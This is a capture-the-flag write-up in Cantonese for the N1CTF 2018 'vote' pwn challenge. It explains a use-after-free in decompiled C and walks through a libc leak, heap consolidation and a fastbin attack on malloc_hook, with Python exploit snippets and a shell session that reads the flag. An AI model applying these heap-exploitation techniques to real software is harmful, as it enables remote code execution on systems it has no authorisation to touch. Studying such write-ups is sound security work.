# vote 250(pwn)

題目:

>hk node: nc 47.90.103.10 6000
>
>cn node: nc 47.97.190.1 6000
>
>(Two challenge servers are identical, use either of them.)
>
>[Download](b8a4590d-9fee-4a34-8396-d63adac62a0d.zip)


menu:
```
0: Create
1: Show
2: Vote
3: Result
4: Cancel
5: Exit
Action: 
```

呢條係經典嘅 use-after-free 題目

Create 嘅 code:

```C++
void sub_400D2C()
{
...........
for ( i = 0; i <= 15; ++i )
  {
    if ( !*(&ptr + i) )
    {
      sub_400C52(4199328LL);
      v2 = sub_400C90(4199328LL);
      if ( v2 > 0 && v2 <= 4096 )
      {
        v0 = malloc(v2 + 16);
        *(_QWORD *)v0 = 0LL;
..............
}
```

Cancel 嘅 code:

```C++
void sub_40109D()
{
  char *v0; // rsi@8
  int v1; // [sp+Ch] [bp-4h]@1

  sub_400C52("Please enter the index: ");
  v1 = sub_400C90("Please enter the index: ");
  if ( v1 >= 0 && v1 <= 15 && *(&ptr + v1) )
  {
    if ( --qword_602180[v1] == --*(_QWORD *)*(&ptr + v1) )
    {
      if ( qword_602180[v1] < 0 )
        free(*(&ptr + v1));
    }
    else if ( qword_602180[v1] < 0 )
    {
      v0 = (char *)*(&ptr + dword_602160) + 16;
      printf("%s", v0);
      fflush(stdout);
      sub_400C00(" has freed", v0);
      free(*(&ptr + v1));
      *(&ptr + v1) = 0LL;
    }
  }
}
```

個bug就係free 之後冇清返ptr array 相應entry做0,引致UAF

有一個注意位就係,如果我request 0x20 name size, 實際會return 0x40 嘅object(冇睇清楚ida code嘅後果.........) 

之後就係基本套路 leak libc-> fastbin attack -> get shell


不過由於冇得直接edit, 所以有好多error chk 要bypass .....


當leak完 libc, trigger consolidation之後, malloc 一個大少少嘅chunk 覆蓋晒之前個d chunk 嘅address

之後再寫假嘅meta data 去上一手memory address 相應嘅位置 (error chk bypass eg 前後位size 要match  )

再free 返chunk 0 防止再malloc 個陣trigger heap inside freed heap error 



之後malloc一個0x50(0x70) 拎左最頂塊chunk,再malloc 一個0x50(0x70) fastbin 就可以有arbitary writing...

```python
create("qqqq",0x50)
create("A"*3+p64(rce)*4,0x50)
print "[+]get shell :)"
r.sendline("0")
sleep(1)
#triger one gadget
r.sendline("4000")
r.sendline("$0")
r.sendline("ls -al")
r.interactive()
```

Contest 個陣唔知點解local libc 會有size error, 於是加左個for loop 令個malloc_hook layout valid返...

可能之前打錯左size 掛??



```python
#just to make the structure around main_arena "align"
#to bypass the malloc checking
#for i in range(1,11):
#    create("QQQQ",0x10*i)

````

# Solution


solution: [solve.py](solve.py)

```
# [*] '/root/Desktop/CTF_Game/n1ctf_2018/vote/libc-2.23.so'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [*] Paused (press any to continue)
# 139870119717752

# 0x7f360ccceb78
# leaked libc =0x7f360c90a000
# malloc_hook = 0x7f360ccceb10
# one = 0x7f360c9fa274
# [+]get shell :)
# [*] Switching to interactive mode
# Please enter the name's size: total 36
# dr-xr-xr-x 2 pwn  pwn   4096 Mar 10 18:38 .
# drwxr-xr-x 3 root root  4096 Mar  8 15:28 ..
# -rw-r--r-- 1 pwn  pwn    220 Mar  8 15:28 .bash_logout
# -rw-r--r-- 1 pwn  pwn   3771 Mar  8 15:28 .bashrc
# -rw-r--r-- 1 pwn  pwn    655 Mar  8 15:28 .profile
# -rw-r--r-- 1 root root    26 Mar  9 11:12 flag
# -rwxr-xr-x 1 root root 10544 Mar  8 15:29 vote
# $ cat flag
# N1CTF{Pr1nTf_2333333333!}
# $  

```
